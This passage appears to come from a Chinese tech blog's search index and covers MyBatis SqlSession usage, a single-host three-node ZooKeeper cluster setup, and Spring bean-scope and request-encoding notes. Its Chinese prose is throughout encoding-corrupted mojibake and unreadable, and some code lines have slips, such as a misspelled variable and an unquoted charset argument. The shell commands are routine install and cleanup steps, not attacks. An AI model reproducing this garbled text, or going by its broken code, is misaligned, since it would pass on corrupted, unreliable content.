SqlSessionï¼Œè¿”å›ä¸€ä¸ªå“åº”åå°±å…³é—­å®ƒã€‚è¿™ä¸ªå…³é—­æ“ä½œå¾ˆé‡è¦ï¼Œä¸ºäº†ç¡®ä¿æ¯æ¬¡éƒ½èƒ½æ‰§è¡Œå…³é—­æ“ä½œï¼Œä½ åº”è¯¥æŠŠè¿™ä¸ªå…³é—­æ“ä½œæ”¾åˆ° finally å—ä¸­ã€‚ä¸‹é¢çš„ç¤ºä¾‹å°±æ˜¯ä¸€ä¸ªç¡®ä¿ SqlSession å…³é—­çš„æ ‡å‡†ä»£ç ï¼š 123try (SqlSession session = sqlSessionFactory.openSession()) { // åº”ç”¨é€»è¾‘ä»£ç } æˆ–è€… 12345678SqlSession session = sqlSessionFactory.openSession();try { // åº”ç”¨é€»è¾‘ä»£ç } finally { if (session != null) { session.close(); }} åœ¨æ‰€æœ‰ä»£ç ä¸­éƒ½éµå¾ªè¿™ç§ä½¿ç”¨æ¨¡å¼ï¼Œå¯ä»¥ä¿è¯æ‰€æœ‰æ•°æ®åº“èµ„æºéƒ½èƒ½è¢«æ­£ç¡®åœ°å…³é—­ã€‚ æ˜ å°„å™¨å®ä¾‹æ˜ å°„å™¨æ˜¯ä¸€äº›ç»‘å®šæ˜ å°„è¯­å¥çš„æ¥å£ã€‚æ˜ å°„å™¨æ¥å£çš„å®ä¾‹æ˜¯ä» SqlSession ä¸­è·å¾—çš„ï¼Œè™½ç„¶ä»æŠ€æœ¯å±‚é¢ä¸Šæ¥è®²ï¼Œä»»ä½•æ˜ å°„å™¨å®ä¾‹çš„æœ€å¤§ä½œç”¨åŸŸä¸è¯·æ±‚å®ƒä»¬çš„ SqlSession ç›¸åŒã€‚ä½†æ–¹æ³•ä½œç”¨åŸŸæ‰æ˜¯æ˜ å°„å™¨å®ä¾‹çš„æœ€åˆé€‚çš„ä½œç”¨åŸŸã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ˜ å°„å™¨å®ä¾‹åº”è¯¥åœ¨è°ƒç”¨å®ƒä»¬çš„æ–¹æ³•ä¸­è¢«è·å–ï¼Œä½¿ç”¨å®Œæ¯•ä¹‹åå³å¯ä¸¢å¼ƒã€‚æ˜ å°„å™¨å®ä¾‹å¹¶ä¸éœ€è¦è¢«æ˜¾å¼åœ°å…³é—­ï¼Œå°½ç®¡åœ¨æ•´ä¸ªè¯·æ±‚ä½œç”¨åŸŸä¿ç•™æ˜ å°„å™¨å®ä¾‹ä¸ä¼šæœ‰ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ä½ å¾ˆå¿«ä¼šå‘ç°ï¼Œåœ¨è¿™ä¸ªä½œç”¨åŸŸä¸Šç®¡ç†å¤ªå¤šåƒ SqlSession çš„èµ„æºä¼šè®©ä½ å¿™ä¸è¿‡æ¥ã€‚å› æ­¤ï¼Œæœ€å¥½å°†æ˜ å°„å™¨æ”¾åœ¨æ–¹æ³•ä½œç”¨åŸŸå†…ï¼Œå°±åƒä¸‹é¢çš„ä¾‹å­ä¸€æ ·ï¼š 1234try (SqlSession session = sqlSessionFactory.openSession()) { EmployeeMapper mapper = session.getMapper(EmployeeMapper.class); // åº”ç”¨é€»è¾‘ä»£ç } ä¸ä½¿ç”¨ XML æ„å»º SqlSessionFactoryå¦‚æœä½ æ›´æ„¿æ„ç›´æ¥ä» Java ä»£ç è€Œä¸æ˜¯ XML æ–‡ä»¶ä¸­åˆ›å»ºé…ç½®ï¼Œæˆ–è€…æƒ³è¦åˆ›å»ºä½ è‡ªå·±çš„é…ç½®å»ºé€ å™¨ï¼ŒMyBatis ä¹Ÿæä¾›äº†å®Œæ•´çš„é…ç½®ç±»ï¼Œæä¾›äº†æ‰€æœ‰ä¸ XML æ–‡ä»¶ç­‰ä»·çš„é…ç½®é¡¹ã€‚ 123456DataSource dataSource = BlogDataSourceFactory.getBlogDataSource();TransactionFactory transactionFactory = new JdbcTransactionFactory();Environment environment = new Environment("development", transactionFactory, dataSource);Configuration configuration = new Configuration(environment);configuration.addMapper(EmployeeMapper.class);SqlSessionFactory sqlSessionFactory = new SqlSessionFactoryBuilder().build(configuration); æ³¨æ„è¯¥ä¾‹ä¸­ï¼ŒConfiguration æ·»åŠ äº†ä¸€ä¸ªæ˜ å°„å™¨ç±»ï¼ˆMapper Classï¼‰ã€‚æ˜ å°„å™¨ç±»æ˜¯ Java ç±»ï¼Œå®ƒä»¬åŒ…å« SQL æ˜ å°„æ³¨è§£ä»è€Œé¿å…ä¾èµ– XML æ–‡ä»¶ã€‚ä¸è¿‡ï¼Œç”±äº Java æ³¨è§£çš„ä¸€äº›é™åˆ¶ä»¥åŠæŸäº› MyBatis æ˜ å°„çš„å¤æ‚æ€§ï¼Œè¦ä½¿ç”¨å¤§å¤šæ•°é«˜çº§æ˜ å°„ï¼ˆæ¯”å¦‚ï¼šåµŒå¥—è”åˆæ˜ å°„ï¼‰ï¼Œä»ç„¶éœ€è¦ä½¿ç”¨ XML é…ç½®ã€‚æœ‰é‰´äºæ­¤ï¼Œå¦‚æœå­˜åœ¨ä¸€ä¸ªåŒå SQL æ˜ å°„æ–‡ä»¶ï¼ˆXMLï¼‰ï¼ŒMyBatis ä¼šè‡ªåŠ¨æŸ¥æ‰¾å¹¶åŠ è½½å®ƒï¼›åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼ŒåŸºäºç±»è·¯å¾„å’Œ EmployeeMapper.class çš„ç±»åï¼Œä¼šåŠ è½½ EmployeeMapper.xmlã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java æ•°æ®åº“"},{title:"Linux å•æœºæ­å»º Zookeeper é›†ç¾¤",url:"/posts/98827cf0.html",text:'å‰è¨€æœ¬æ–‡é€‚ç”¨äºåœ¨ Centos/Debian/Ubuntu ç­‰ Linux å‘è¡Œç‰ˆç³»ç»Ÿä¸Šï¼Œä½¿ç”¨å•æœºæ­å»º Zookeeper é›†ç¾¤ã€‚ Zookeeper ç®€ä»‹Zookeeper æ˜¯ä¸€ä¸ªé«˜æ•ˆçš„åˆ†å¸ƒå¼åè°ƒæœåŠ¡ï¼Œå¯ä»¥æä¾›é…ç½®ä¿¡æ¯ç®¡ç†ã€å‘½åã€åˆ†å¸ƒå¼åŒæ­¥ã€é›†ç¾¤ç®¡ç†ã€æ•°æ®åº“åˆ‡æ¢ç­‰æœåŠ¡ã€‚å®ƒä¸é€‚åˆç”¨æ¥å­˜å‚¨å¤§é‡ä¿¡æ¯ï¼Œå¯ä»¥ç”¨æ¥å­˜å‚¨ä¸€äº›é…ç½®ã€å‘å¸ƒä¸è®¢é˜…ç­‰å°‘é‡ä¿¡æ¯ã€‚Hadoopã€Stormã€æ¶ˆæ¯ä¸­é—´ä»¶ã€RPC æœåŠ¡æ¡†æ¶ã€åˆ†å¸ƒå¼æ•°æ®åº“åŒæ­¥ç³»ç»Ÿï¼Œè¿™äº›éƒ½æ˜¯ Zookeeper çš„åº”ç”¨åœºæ™¯ã€‚ Zookeeper é›†ç¾¤ç®€ä»‹åœ¨ Linux å•æœºä¸Šæ­å»º Zookeeper é›†ç¾¤ï¼Œè‡³å°‘éœ€è¦ä¸‰ä¸ªèŠ‚ç‚¹ã€‚ è§’è‰²åˆ’åˆ†Zookeeper é›†ç¾¤æœ‰ä¸‰ç§è§’è‰²åˆ’åˆ†ï¼Œåˆ†åˆ«æ˜¯ leaderã€followerã€observerï¼š é¢†å¯¼è€…ï¼ˆleaderï¼‰ï¼šè´Ÿè´£è¿›è¡ŒæŠ•ç¥¨çš„å‘èµ·å’Œå†³è®®ï¼Œæ›´æ–°ç³»ç»ŸçŠ¶æ€ã€‚ è·Ÿéšè€…ï¼ˆfollowerï¼‰ï¼šç”¨äºæ¥æ”¶å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå¹¶å‘å®¢æˆ·ç«¯è¿”å›ç»“æœï¼Œä»¥åŠåœ¨é€‰ä¸¾è¿‡ç¨‹ä¸­å‚ä¸æŠ•ç¥¨ è§‚å¯Ÿè€…ï¼ˆobserverï¼‰ï¼šå¯ä»¥æ¥æ”¶å®¢æˆ·ç«¯è¿æ¥ï¼Œå°†å†™è¯·æ±‚è½¬å‘ç»™ leader èŠ‚ç‚¹ï¼Œä½†æ˜¯ä¸å‚ä¸æŠ•ç¥¨è¿‡ç¨‹ï¼ŒåªåŒæ­¥ leader çš„çŠ¶æ€ï¼Œé€šå¸¸ç”¨ä½œå¯¹æŸ¥è¯¢æ“ä½œåšè´Ÿè½½ã€‚ ç«¯å£ä½œç”¨ 2181ï¼šå¯¹å®¢æˆ·ç«¯ç«¯æä¾›æœåŠ¡ 2888: é›†ç¾¤å†…æœºå™¨ç›¸äº’é€šä¿¡ä½¿ç”¨ 3888: é€‰ä¸¾ leader ä½¿ç”¨ Zookeeper é›†ç¾¤æ­å»ºé›†ç¾¤è§„åˆ’ èŠ‚ç‚¹ IP åœ°å€ ç«¯å£ ç‰ˆæœ¬å· èŠ‚ç‚¹ 1 127.0.0.1 2181, 2881, 3881 3.4.10 èŠ‚ç‚¹ 2 127.0.0.1 2182, 2882, 3882 3.4.10 èŠ‚ç‚¹ 3 127.0.0.1 2183, 2883, 3883 3.4.10 é›†ç¾¤æ­å»º Zookeeper ä¸‹è½½ Zookeeper çš„æœ€æ–°ç‰ˆæœ¬å¯ä»¥ä» å®˜ç½‘ ä¸‹è½½ï¼Œå†å²ç‰ˆæœ¬åˆ™å¯ä»¥ä» è¿™é‡Œ ä¸‹è½½ã€‚ Zookeeper å®‰è£… 1234567891011121314151617# åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/zookeeper-cluster# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/zookeeper-cluster# ä¸‹è½½å‹ç¼©åŒ…# wget https://archive.apache.org/dist/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz# è§£å‹æ–‡ä»¶# tar -xvf zookeeper-3.4.10.tar.gz# é‡å‘½åç›®å½•# mv zookeeper-3.4.10 zookeeper-node-1# åˆ é™¤å‹ç¼©åŒ…# rm -rf zookeeper-3.4.10.tar.gz Zookeeper é…ç½® 1234567891011121314# è¿›å…¥å®‰è£…ç›®å½•# cd /usr/local/zookeeper-cluster/zookeeper-node-1# åˆ›å»ºæ•°æ®å­˜å‚¨ç›®å½•# mkdir data# åˆ›å»ºæ—¥å¿—å­˜å‚¨ç›®å½•# mkdir logs# å¤åˆ¶é…ç½®æ–‡ä»¶# cp conf/zoo_sample.cfg conf/zoo.cfg# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼ˆæŒ‡å®šä»¥ä¸‹å†…å®¹å³å¯ï¼‰# vim conf/zoo.cfg 123456789# åŸºç¡€é…ç½®clientPort=2181dataDir=/usr/local/zookeeper-cluster/zookeeper-node-1/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-1/logs# é›†ç¾¤é…ç½®server.1=127.0.0.1:2881:3881server.2=127.0.0.1:2882:3882server.3=127.0.0.1:2883:3883 æç¤º server.1=127.0.0.1:2881:3881ï¼Œåˆ†åˆ«å¯¹åº” server.serverid=host:tickpot:electionport serveridï¼šæ˜¯ä¸€ä¸ªæ•°å­—ï¼Œè¡¨ç¤ºè¿™æ˜¯ç¬¬å‡ å·æœåŠ¡å™¨ã€‚ä¸‹æ–‡æåˆ°çš„ myid æ–‡ä»¶é‡Œé¢æœ‰ä¸€ä¸ªæ•°æ®å°±æ˜¯å®ƒçš„å€¼ã€‚Zookeeper å¯åŠ¨æ—¶ä¼šè¯»å–è¯¥æ–‡ä»¶ï¼Œç„¶åæ‹¿åˆ°é‡Œé¢çš„æ•°æ®ä¸ zoo.cfg é‡Œé¢çš„é…ç½®ä¿¡æ¯æ¯”è¾ƒï¼Œä»è€Œåˆ¤æ–­å½“å‰èŠ‚ç‚¹æ˜¯å“ªä¸ª server hostï¼šæœåŠ¡å™¨çš„åœ°å€ï¼Œå³ä¸»æœºå / IP åœ°å€ tickpotï¼šæœåŠ¡å™¨ Follower ä¸é›†ç¾¤ä¸­çš„ Leader æœåŠ¡å™¨äº¤æ¢ä¿¡æ¯çš„ç«¯å£ electionportï¼šç”¨æ¥æ‰§è¡Œé€‰ä¸¾æ—¶æœåŠ¡å™¨ç›¸äº’é€šä¿¡çš„ç«¯å£ Zookeeper åˆ›å»º myid æ–‡ä»¶ åœ¨ Zookeeper çš„ data ç›®å½•ä¸‹åˆ›å»º myid æ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹æ˜¯æ˜¯ 1ï¼ˆæœåŠ¡å™¨ç¼–å·ï¼‰ã€‚ 12# åˆ›å»ºmyidæ–‡ä»¶ï¼Œå¹¶å†™å…¥æ•°æ®# echo "1" &gt; /usr/local/zookeeper-cluster/zookeeper-node-1/data/myid æ³¨æ„ myid æ–‡ä»¶é‡Œçš„æœåŠ¡å™¨ç¼–å·å¯ä»¥è‡ªå®šä¹‰ï¼ˆå…¨å±€å”¯ä¸€ï¼‰ï¼Œä½†æ˜¯ä¸Šä¸‹ä¸è¦æœ‰ç©ºè¡Œï¼Œå·¦å³ä¸è¦æœ‰ç©ºæ ¼ã€‚ Zookeeper åˆ›å»ºå¤šä¸ªèŠ‚ç‚¹ å¤åˆ¶ä¸¤ä»½ä¸Šé¢å·²ç»é…ç½®å¥½çš„ Zookeeper å®‰è£…ç›®å½•ï¼Œä»¥æ­¤ä½œä¸ºé›†ç¾¤ä¸­å¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹çš„å®‰è£…æ–‡ä»¶ï¼Œä¾‹å¦‚ zookeeper-node-2 å’Œ zookeeper-node-3ã€‚å®‰è£…ç›®å½•å¤åˆ¶å®Œæˆåï¼Œè¿˜éœ€è¦æ›´æ”¹æ¯ä¸ªæ–°èŠ‚ç‚¹é‡Œçš„ zoo.cfg é…ç½®æ–‡ä»¶çš„ clientPortã€dataDirã€dataLogDirï¼Œå¹¶é‡æ–°æŒ‡å®š myid æ–‡ä»¶é‡Œçš„æœåŠ¡å™¨ç¼–å·ã€‚å¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹çš„é…ç½®å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 1234567# èŠ‚ç‚¹äºŒçš„zoo.cfgæ–‡ä»¶clientPort=2182dataDir=/usr/local/zookeeper-cluster/zookeeper-node-2/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-2/logs# èŠ‚ç‚¹äºŒçš„myidæ–‡ä»¶# echo "2" &gt; /usr/local/zookeeper-cluster/zookeeper-node-2/data/myid 1234567# èŠ‚ç‚¹ä¸‰çš„zoo.cfgæ–‡ä»¶clientPort=2183dataDir=/usr/local/zookeeper-cluster/zookeeper-node-3/datadataLogDir=/usr/local/zookeeper-cluster/zookeeper-node-3/logs# èŠ‚ç‚¹ä¸‰çš„myidæ–‡ä»¶# echo "3" &gt; /usr/local/zookeeper-cluster/zookeeper-node-3/data/myid é›†ç¾¤ç®¡ç†ç®¡ç†å‘½ä»¤å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒZookeeper çš„ç®¡ç†å‘½ä»¤ï¼ˆShell è„šæœ¬ï¼‰éƒ½åœ¨å¯¹åº”å®‰è£…ç›®å½•çš„ bin ç›®å½•ä¸‹ã€‚ 12345678# å¯åŠ¨æœåŠ¡# ./zkServer.sh start# å…³é—­æœåŠ¡# ./zkServer.sh stop# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# ./zkServer.sh status æˆ–è€…æŒ‡å®šé…ç½®æ–‡ä»¶è¿›è¡Œæ“ä½œï¼š 12345678# å¯åŠ¨æœåŠ¡# ./zkServer.sh start ../conf/zoo.cfg # å…³é—­æœåŠ¡# ./zkServer.sh stop ../conf/zoo.cfg # æŸ¥çœ‹æœåŠ¡çŠ¶æ€# ./zkServer.sh status ../conf/zoo.cfg é›†ç¾¤å¯åŠ¨ å¯åŠ¨é›†ç¾¤ 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh start# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh start æŸ¥çœ‹çŠ¶æ€ 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status é›†ç¾¤æ­£å¸¸å¯åŠ¨åï¼Œå„ä¸ªèŠ‚ç‚¹è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯å¦‚ä¸‹ï¼Œæ­¤æ—¶é›†ç¾¤çš„ Leader æ˜¯èŠ‚ç‚¹äºŒ 123456789101112131415ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-2/bin/../conf/zoo.cfgMode: leader-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: follower å…³é—­é›†ç¾¤ 123# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh stop æ¸…ç©ºæ•°æ® è‹¥å¸Œæœ›æ¸…ç©º Zookeper é›†ç¾¤çš„æ•°æ®ï¼Œåˆ™å¯ä»¥å…ˆå…³é—­é›†ç¾¤ï¼Œç„¶åå†åˆ é™¤ Zookeeper å®‰è£…ç›®å½•ä¸‹çš„ data å’Œ logs å­ç›®å½•ä¸‹çš„æ•°æ®æ–‡ä»¶ï¼ˆä¸åŒ…æ‹¬ myid æ–‡ä»¶ï¼‰å³å¯ã€‚æ¸…ç©ºæ•°æ®çš„æ“ä½œä¸å¯æ¢å¤ï¼Œç”Ÿäº§ç¯å¢ƒä¸‹æ…ç”¨ã€‚ 123456# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-1/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-2/logs/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/data/version-2# rm -rf /usr/local/zookeeper-cluster/zookeeper-node-3/logs/version-2 æµ‹è¯•é›†ç¾¤æ•°æ®åŒæ­¥æµ‹è¯• è¿æ¥èŠ‚ç‚¹ä¸€ï¼Œå¹¶åˆ›å»ºæ–‡ä»¶å¤¹ 12345678910# è¿æ¥èŠ‚ç‚¹ä¸€# ./zkCli.sh -server 127.0.0.1:2181# åˆ›å»ºæ–‡ä»¶å¤¹[zk: 127.0.0.1:2181(CONNECTED) 3] create /test ""Created /test# æŸ¥çœ‹ç›®å½•ä¿¡æ¯[zk: 127.0.0.1:2181(CONNECTED) 4] ls /[zookeeper, test] æ­¤æ—¶è¿æ¥å…¶ä»–ä»»æ„èŠ‚ç‚¹ï¼Œå¯ä»¥å‘ç° test æ–‡ä»¶å¤¹ä¼šåŒæ­¥åˆ›å»ºï¼Œå³åœ¨ä»»ä½•ä¸€ä¸ªé›†ç¾¤èŠ‚ç‚¹è¿›è¡Œæ“ä½œï¼Œå…¶ä»–é›†ç¾¤èŠ‚ç‚¹ä¹Ÿä¼šåŒæ­¥æ›´æ–°ã€‚ 123456# è¿æ¥èŠ‚ç‚¹äºŒ# ./zkCli.sh -server 127.0.0.1:2182# æŸ¥çœ‹ç›®å½•ä¿¡æ¯[zk: 127.0.0.1:2182(CONNECTED) 0] ls /[zookeeper, test] å®•æœºé‡æ–°é€‰ä¸¾æµ‹è¯• å…³é—­ Leaderï¼ˆèŠ‚ç‚¹äºŒï¼‰ 1# /usr/local/zookeeper-cluster/zookeeper-node-2/bin/zkServer.sh stop æŸ¥çœ‹å…¶ä»–èŠ‚ç‚¹çš„çŠ¶æ€ï¼ˆèŠ‚ç‚¹ä¸€ã€èŠ‚ç‚¹ä¸‰ï¼‰ 12# /usr/local/zookeeper-cluster/zookeeper-node-1/bin/zkServer.sh status# /usr/local/zookeeper-cluster/zookeeper-node-3/bin/zkServer.sh status å…³é—­ Leaderï¼ˆèŠ‚ç‚¹äºŒï¼‰ï¼Œç­‰å¾…è¶…æ—¶æ—¶é—´åˆ°äº†ä¹‹åï¼Œé‡æ–°æŸ¥çœ‹å„ä¸ªèŠ‚ç‚¹çš„çŠ¶æ€ï¼Œä¼šå‘ç°èŠ‚ç‚¹ä¸‰è¢«é€‰ä¸¾ä¸ºæ–°çš„ Leaderã€‚ 123456789ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-1/bin/../conf/zoo.cfgMode: follower-------------------------------------------------------------------------------ZooKeeper JMX enabled by defaultUsing config: /usr/local/zookeeper-cluster/zookeeper-node-3/bin/../conf/zoo.cfgMode: leader å‚è€ƒåšå®¢ Linux ä¸‹å•æœºå®ç° Zookeeper é›†ç¾¤ Linux ä¸‹æ­å»ºå•æœº Zookeeper é›†ç¾¤ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"linux"},{title:"Spring é¢è¯•é¢˜ä¹‹ä¸€",url:"/posts/16617d7.html",text:'Spring åŸºç¡€Spring Bean çš„äº”ä¸ªä½œç”¨åŸŸ ç±»åˆ« è¯´æ˜ singleton Spring IOC å®¹å™¨ä¸€å¼€å§‹å°±ä¼šå®ä¾‹åŒ–è¯¥ Beanï¼Œä¸”åœ¨æ•´ä¸ª Spring IOC å®¹å™¨ä¸­ï¼Œä½¿ç”¨ singleton å®šä¹‰çš„ Bean å°†åªæœ‰ä¸€ä¸ªå®ä¾‹ prototype Spring IOC å®¹å™¨ä¸€å¼€å§‹ä¸ä¼šå®ä¾‹åŒ–è¯¥ Beanï¼Œè€Œæ˜¯æ¯æ¬¡é€šè¿‡å®¹å™¨çš„ getBean () æ–¹æ³•è·å– prototype å®šä¹‰çš„ Bean æ—¶ï¼Œéƒ½å°†äº§ç”Ÿä¸€ä¸ªæ–°çš„ Bean å®ä¾‹ request å¯¹äºæ¯æ¬¡ HTTP è¯·æ±‚ï¼Œä½¿ç”¨ request å®šä¹‰çš„ Bean éƒ½å°†äº§ç”Ÿä¸€ä¸ªæ–°å®ä¾‹ï¼Œå³æ¯æ¬¡ HTTP è¯·æ±‚å°†ä¼šäº§ç”Ÿä¸åŒçš„ Bean å®ä¾‹ï¼Œåªæœ‰åœ¨ Web åº”ç”¨ä¸­ä½¿ç”¨ Spring æ—¶ï¼Œè¯¥ä½œç”¨åŸŸæ‰æœ‰æ•ˆ session å¯¹äºæ¯æ¬¡ HTTP Sessionï¼Œä½¿ç”¨ session å®šä¹‰çš„ Bean éƒ½å°†äº§ç”Ÿä¸€ä¸ªæ–°å®ä¾‹ï¼ŒåŒæ ·åªæœ‰åœ¨ Web åº”ç”¨ä¸­ä½¿ç”¨ Spring æ—¶ï¼Œè¯¥ä½œç”¨åŸŸæ‰æœ‰æ•ˆ globalsession æ¯ä¸ªå…¨å±€çš„ HTTP Sessionï¼Œä½¿ç”¨ session å®šä¹‰çš„ Bean éƒ½å°†äº§ç”Ÿä¸€ä¸ªæ–°å®ä¾‹ï¼ŒåŒæ ·åªæœ‰åœ¨ Web åº”ç”¨ä¸­ä½¿ç”¨ Spring æ—¶ï¼Œè¯¥ä½œç”¨åŸŸæ‰æœ‰æ•ˆ å…¶ä¸­æ¯”è¾ƒå¸¸ç”¨çš„æ˜¯ singleton å’Œ prototype ä¸¤ç§ä½œç”¨åŸŸã€‚å¯¹äº singleton ä½œç”¨åŸŸçš„ Beanï¼Œæ¯æ¬¡è¯·æ±‚è¯¥ Bean éƒ½å°†è·å¾—ç›¸åŒçš„å®ä¾‹ï¼Œå®¹å™¨è´Ÿè´£è·Ÿè¸ª Bean å®ä¾‹çš„çŠ¶æ€ï¼Œè´Ÿè´£ç»´æŠ¤ Bean å®ä¾‹çš„ç”Ÿå‘½å‘¨æœŸï¼›å¦‚æœä¸€ä¸ª Bean è¢«è®¾ç½®æˆ prototype ä½œç”¨åŸŸï¼Œç¨‹åºæ¯æ¬¡è¯·æ±‚è¯¥ id çš„ Bean æ—¶ï¼ŒSpring éƒ½ä¼šæ–°å»ºä¸€ä¸ª Bean å®ä¾‹ï¼Œç„¶åè¿”å›ç»™ç¨‹åºã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒSpring å®¹å™¨ä»…ä»…ä½¿ç”¨ new å…³é”®å­—åˆ›å»º Bean å®ä¾‹ï¼Œä¸€æ—¦åˆ›å»ºæˆåŠŸï¼Œå®¹å™¨ä¸åœ¨è·Ÿè¸ªå®ä¾‹ï¼Œä¹Ÿä¸ä¼šç»´æŠ¤ Bean å®ä¾‹çš„çŠ¶æ€ã€‚å¦‚æœä¸æŒ‡å®š Bean çš„ä½œç”¨åŸŸï¼ŒSpring é»˜è®¤ä½¿ç”¨ singleton ä½œç”¨åŸŸã€‚Java åœ¨åˆ›å»ºå®ä¾‹æ—¶ï¼Œéœ€è¦è¿›è¡Œå†…å­˜ç”³è¯·ï¼›é”€æ¯å®ä¾‹æ—¶ï¼Œéœ€è¦å®Œæˆåƒåœ¾å›æ”¶ï¼Œè¿™äº›å·¥ä½œéƒ½ä¼šå¯¼è‡´ç³»ç»Ÿå¼€é”€çš„å¢åŠ ã€‚å› æ­¤ï¼Œprototype ä½œç”¨åŸŸä¸‹ Bean çš„åˆ›å»ºã€é”€æ¯ä»£ä»·æ¯”è¾ƒå¤§ï¼›è€Œ singleton ä½œç”¨åŸŸçš„ Bean å®ä¾‹ä¸€æ—¦åˆ›å»ºæˆåŠŸï¼Œå¯ä»¥é‡å¤ä½¿ç”¨ã€‚å› æ­¤ï¼Œé™¤éå¿…è¦ï¼Œåº”å°½é‡é¿å…å°† Bean è¢«è®¾ç½®æˆ prototype ä½œç”¨åŸŸã€‚ Spring MVCSpring MVC ä¸­è§£å†³è¯·æ±‚ä¹±ç è§£å†³ POST è¯·æ±‚ä¹±ç 12345678910111213141516171819202122&lt;!-- é…ç½®SpringVMCçš„å­—ç¬¦ç¼–ç è¿‡æ»¤å™¨ --&gt;&lt;filter&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;filter-class&gt;org.springframework.web.filter.CharacterEncodingFilter&lt;/filter-class&gt; &lt;init-param&gt; &lt;param-name&gt;encoding&lt;/param-name&gt; &lt;param-value&gt;utf-8&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceRequestEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;forceResponseEncoding&lt;/param-name&gt; &lt;param-value&gt;true&lt;/param-value&gt; &lt;/init-param&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;encoding&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt; è§£å†³ GET è¯·æ±‚ä¹±ç æ–¹æ³•ä¸€ï¼Œé€šè¿‡ Java ä»£ç æ‰‹åŠ¨æŒ‡å®šå­—ç¬¦ç¼–ç ï¼š 1String name = new String (resuest.getParameter("name").getBytes("ISO8859-1"), utf-8); æ–¹æ³•äºŒï¼Œé€šè¿‡é…ç½® Tomcat çš„ server.xml é…ç½®æ–‡ä»¶æŒ‡å®šå­—ç¬¦ç¼–ç ï¼š 1&lt;Connector connectionTimeout="20000" port="8080" protocol="HTTP/1.1" redirectPort="8443" URIEncoding="UTF-8"/&gt; Spring MVC çš„å·¥ä½œæµç¨‹Spring MVC å¤„ç†æ¨¡å‹æ•°æ® å¤„ç†æ¨¡å‹æ•°æ®çš„æ–¹å¼ä¸€ï¼šå°† Controller ä¸­æ–¹æ³•çš„è¿”å›å€¼è®¾ç½®ä¸º ModelAndView å¤„ç†æ¨¡å‹æ•°æ®çš„æ–¹å¼äºŒï¼šå°† Controller ä¸­æ–¹æ³•çš„è¿”å›å€¼è®¾ç½®ä¸º Stringï¼Œåœ¨æ–¹æ³•çš„å…¥å‚ä¸­ä¼ å…¥ Mapã€Model æˆ–è€… ModelMap 